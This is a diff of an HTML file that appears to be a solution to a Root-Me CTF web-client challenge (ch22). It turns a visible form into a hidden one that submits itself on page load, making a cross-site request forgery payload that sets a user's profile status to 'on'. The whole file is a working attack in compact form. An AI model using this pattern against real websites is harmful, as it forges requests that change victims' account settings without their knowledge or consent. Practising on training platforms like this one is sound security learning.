@@ -1,6 +1,5 @@
 <form name="truc" id="truc" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
-  <input type="text" name="username" value="rayan" />
-  <input type="checkbox" name="status" value="on" />
-  <input type="submit" value="Submit" />
+  <input type="hidden" name="username" value="rayan" />
+  <input type="hidden" name="status" value="on" />
 </form>
-<script>document.getElementById('truc').submit();</script>
+<script>document.truc.submit()</script>
